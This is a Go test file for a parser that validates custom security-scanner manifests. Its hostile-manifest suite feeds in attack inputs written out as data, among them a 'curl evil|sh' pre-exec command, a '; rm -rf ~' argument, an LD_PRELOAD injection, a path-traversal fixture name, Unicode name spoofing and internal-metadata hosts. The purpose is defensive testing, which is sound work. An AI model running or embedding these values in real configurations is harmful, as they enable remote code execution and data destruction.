package seccustom

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/marmutapp/superbased-observer/internal/testsupport/importpin"
)

// TestPureImports pins the package pure (CLAUDE.md module rule 1).
func TestPureImports(t *testing.T) {
	t.Parallel()
	importpin.Check(t, importpin.Spec{
		Forbidden: []string{"os", "os/exec", "io/ioutil", "path/filepath", "net/http", "database/sql", "syscall", "github.com/fsnotify/fsnotify"},
		Reason:    "security pillar plan section 8.6: the custom driver's core is pure; I/O lives in internal/seccustomsvc",
	})
}

const testSum = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

// baseManifest is the gosec template with an executable and digests, as
// a manifest file would carry it.
func baseManifest() map[string]any {
	tpl, _ := TemplateByID("gosec")
	m := FromTemplate(tpl, "/opt/gosec/bin/gosec", []string{"/usr/local/go/bin/go"})
	m.ExecutableSHA256 = testSum
	b, _ := json.Marshal(m)
	var out map[string]any
	_ = json.Unmarshal(b, &out)
	return out
}

func encode(m map[string]any) string { b, _ := json.Marshal(m); return string(b) }

// with returns a deep copy of base with the dotted path set to v.
func with(base map[string]any, path string, v any) map[string]any {
	b, _ := json.Marshal(base)
	var m map[string]any
	_ = json.Unmarshal(b, &m)
	parts := strings.Split(path, ".")
	cur := m
	for _, p := range parts[:len(parts)-1] {
		next, ok := cur[p].(map[string]any)
		if !ok {
			next = map[string]any{}
			cur[p] = next
		}
		cur = next
	}
	cur[parts[len(parts)-1]] = v
	return m
}

// TestHostileManifests is the JSP-12 hostile manifest suite, ported to the
// final format: every row is refused or accepted as the spike recorded.
// The executable file checks (symlink, mode bits, sticky directory, digest)
// are rows of TestCheckExecutable, since they read the file system.
func TestHostileManifests(t *testing.T) {
	t.Parallel()
	base := baseManifest()
	org := Options{OrgApproved: true}
	rows := []struct {
		name   string
		in     string
		opt    Options
		accept bool
	}{
		{"valid gosec template", encode(base), Options{}, true},
		{"relative executable", encode(with(base, "executable", "gosec")), Options{}, false},
		{"executable with a parent segment", encode(with(base, "executable", "/opt/gosec/../gosec/bin/gosec")), Options{}, false},
		{"executable with an empty element", encode(with(base, "executable", "/opt//gosec")), Options{}, false},
		{"digest upper case", encode(with(base, "executable_sha256", strings.ToUpper(testSum))), Options{}, false},
		{"digest too short", encode(with(base, "executable_sha256", "abc")), Options{}, false},
		{"unknown top-level key (pre_exec)", strings.Replace(encode(base), `"argv"`, `"pre_exec":"curl evil|sh","argv"`, 1), Options{}, false},
		{"unknown nested key (limits.nice)", strings.Replace(encode(base), `"wall_seconds"`, `"nice":-20,"wall_seconds"`, 1), Options{}, false},
		{"duplicate key: executable twice", strings.Replace(encode(base), `"argv"`, `"executable":"/bin/sh","argv"`, 1), Options{}, false},
		{"duplicate key nested: network.mode twice", strings.Replace(encode(base), `"mode":"none"`, `"mode":"none","mode":"hosts"`, 1), Options{}, false},
		{"file over 64 KiB", encode(with(base, "version", strings.Repeat("v", 70<<10))), Options{}, false},
		{"name 300 bytes", encode(with(base, "name", strings.Repeat("n", 300))), Options{}, false},
		{"name with RIGHT-TO-LEFT OVERRIDE (dialog spoofing)", encode(with(base, "name", "gosec‮exe.lanigiro")), Options{}, false},
		{"name with a zero-width space", encode(with(base, "name", "go​sec")), Options{}, false},
		{"name with an ANSI escape", encode(with(base, "name", "\x1b[2Jgosec")), Options{}, false},
		{"argv with an ANSI escape", encode(with(base, "argv", []string{"\x1b[2J", "{output_file}"})), Options{}, false},
		{"argv unknown placeholder {home}", encode(with(base, "argv", []string{"{home}", "{output_file}"})), Options{}, false},
		{"argv placeholder inside an argument", encode(with(base, "argv", []string{"--out={output_file}"})), Options{}, false},
		{"argv placeholder twice", encode(with(base, "argv", []string{"{output_file}", "{output_file}"})), Options{}, false},
		{"argv {project_root} twice", encode(with(base, "argv", []string{"{output_file}", "{project_root}", "{project_root}"})), Options{}, false},
		{"argv stray brace", encode(with(base, "argv", []string{"{output_file}", "{x"})), Options{}, false},
		{"argv with a NUL", encode(with(base, "argv", []string{"{output_file}", "a\x00b"})), Options{}, false},
		{"argv 40 entries", encode(with(base, "argv", append([]string{"{output_file}"}, make([]string, 39)...))), Options{}, false},
		{"argv shell metacharacters (literal, no shell)", encode(with(base, "argv", []string{"{output_file}", "; rm -rf ~"})), Options{}, true},
		{"argv with {project_root} (JSP-12 addition)", encode(with(base, "argv", []string{"{output_file}", "{project_root}"})), Options{}, true},
		{"sarif_file output without {output_file}", encode(with(base, "argv", []string{"./..."})), Options{}, false},
		{"targets_file input without {targets_file}", encode(with(base, "input", "targets_file")), Options{}, false},
		{"input not in the closed set", encode(with(base, "input", "shell")), Options{}, false},
		{"limits not a fixed step (memory 999999)", encode(with(base, "limits.memory_mib", 999999)), Options{}, false},
		{"limits child_processes 1 (below the thread-aware floor)", encode(with(base, "limits.child_processes", 1)), Options{}, false},
		{"limits negative", encode(with(base, "limits.wall_seconds", -1)), Options{}, false},
		{"limits as a nested array", strings.Replace(encode(base), `"wall_seconds":600`, `"wall_seconds":[[[[1]]]]`, 1), Options{}, false},
		{"network wildcard host", encode(with(base, "network", map[string]any{"mode": "hosts", "hosts": []string{"*"}})), Options{}, false},
		{"network loopback IP", encode(with(base, "network", map[string]any{"mode": "hosts", "hosts": []string{"127.0.0.1"}})), Options{}, false},
		{"network localhost", encode(with(base, "network", map[string]any{"mode": "hosts", "hosts": []string{"localhost"}})), Options{}, false},
		{"network private IP", encode(with(base, "network", map[string]any{"mode": "hosts", "hosts": []string{"10.0.0.5"}})), Options{}, false},
		{"network .internal name", encode(with(base, "network", map[string]any{"mode": "hosts", "hosts": []string{"metadata.google.internal"}})), Options{}, false},
		{"network 9 hosts", encode(with(base, "network", map[string]any{"mode": "hosts", "hosts": []string{"a.example", "b.example", "c.example", "d.example", "e.example", "f.example", "g.example", "h.example", "i.example"}})), Options{}, false},
		{"network public host (allowed by shape)", encode(with(base, "network", map[string]any{"mode": "hosts", "hosts": []string{"api.osv.dev"}})), Options{}, true},
		{"network none with hosts", encode(with(base, "network", map[string]any{"mode": "none", "hosts": []string{"api.osv.dev"}})), Options{}, false},
		{"severity source not in the closed set", encode(with(base, "severity_map.source", "eval:level")), Options{}, false},
		{"severity value catastrophic", encode(with(base, "severity_map.levels", map[string]string{"HIGH": "catastrophic"})), Options{}, false},
		{"env not in the closed table", encode(with(base, "env", []string{"LD_PRELOAD=/tmp/x.so"})), Options{}, false},
		{"env sets one name twice", encode(with(base, "env", []string{"GOFLAGS=-mod=mod", "GOFLAGS=-mod=readonly"})), Options{}, false},
		{"self_test fixture unknown", encode(with(base, "self_test.fixture", "../../etc")), Options{}, false},
		{"unknown_stderr with an ANSI escape", encode(with(base, "unknown_stderr", []string{"\x1b[31mx"})), Options{}, false},
		{"exit code meaning not in the closed set", encode(with(base, "exit_codes", []map[string]any{{"code": 0, "meaning": "pass"}})), Options{}, false},
		{"exit codes all failures", encode(with(base, "exit_codes", []map[string]any{{"code": 0, "meaning": "failure"}})), Options{}, false},
		{"category Observer owns (agent_config)", encode(with(base, "category", "agent_config")), Options{}, false},
		{"companion relative path", encode(with(base, "companions", []map[string]any{{"path": "go"}})), Options{}, false},
		{"blocking_rules on a local import", encode(with(base, "blocking_rules", []string{"G101"})), Options{}, false},
		{"blocking_rules on an org-approved import", encode(with(base, "blocking_rules", []string{"G101"})), org, true},
		{"wrong schema", encode(with(base, "schema", "sbo.custom-scanner.v0")), Options{}, false},
		{"trailing second object", encode(base) + `{"name":"x"}`, Options{}, false},
		{"top level is an array", "[" + encode(base) + "]", Options{}, false},
		{"byte order mark", "\xef\xbb\xbf" + encode(base), Options{}, false},
		{"invalid UTF-8", strings.Replace(encode(base), `"gosec"`, "\"go\xffsec\"", 1), Options{}, false},
		{"nesting 10000 deep", `{"name":` + strings.Repeat("[", 10000) + strings.Repeat("]", 10000) + `}`, Options{}, false},
	}
	for _, r := range rows {
		_, err := Parse([]byte(r.in), r.opt)
		if (err == nil) != r.accept {
			t.Errorf("%s: accept=%v, err=%v", r.name, err == nil, err)
		}
	}
}

// TestTemplatesAreValidManifests: every built-in template, once given an
// executable, its companions and a digest, passes the strict reader, and
// its round trip keeps the digest.
func TestTemplatesAreValidManifests(t *testing.T) {
	t.Parallel()
	if len(Templates()) != 3 {
		t.Fatalf("templates: %d", len(Templates()))
	}
	for _, tpl := range Templates() {
		var comps []string
		for range tpl.Companions {
			comps = append(comps, "/usr/bin/companion-"+tpl.ID)
		}
		m := FromTemplate(tpl, "/opt/"+tpl.ID+"/bin/"+tpl.ID, comps)
		m.ExecutableSHA256 = testSum
		b, err := json.Marshal(m)
		if err != nil {
			t.Fatal(err)
		}
		got, err := Parse(b, Options{})
		if err != nil {
			t.Fatalf("%s: %v", tpl.ID, err)
		}
		if got.Digest() != m.Digest() {
			t.Fatalf("%s: digest changed on a round trip", tpl.ID)
		}
		if m.SelfTest != nil {
			if _, _, ok := FixtureFiles(m.SelfTest.Fixture); !ok {
				t.Fatalf("%s: fixture %s missing", tpl.ID, m.SelfTest.Fixture)
			}
		}
	}
	if _, ok := TemplateByID("codeql"); ok {
		t.Fatal("codeql must not be a template until the protocol has a two-step shape")
	}
}

func TestFixtureFilesKeepTheirRealNames(t *testing.T) {
	t.Parallel()
	_, paths, ok := FixtureFiles("go-basic")
	if !ok || strings.Join(paths, ",") != "go.mod,main.go,sub/sub.go" {
		t.Fatalf("go-basic: %v %v", paths, ok)
	}
	if _, _, ok := FixtureFiles("nope"); ok {
		t.Fatal("an unknown fixture resolved")
	}
}

func TestDriverID(t *testing.T) {
	t.Parallel()
	for in, want := range map[string]string{"gosec": "gosec", "My Scanner 2!": "my-scanner-2", "--x--": "x"} {
		if got, err := DriverID(in); err != nil || got != want || !ValidID(got) {
			t.Errorf("DriverID(%q) = %q %v", in, got, err)
		}
	}
	if _, err := DriverID("!!!"); err == nil {
		t.Error("no letters must be refused")
	}
	if ValidID("../x") || ValidID("") || ValidID("-a") {
		t.Error("ValidID accepted a bad id")
	}
}
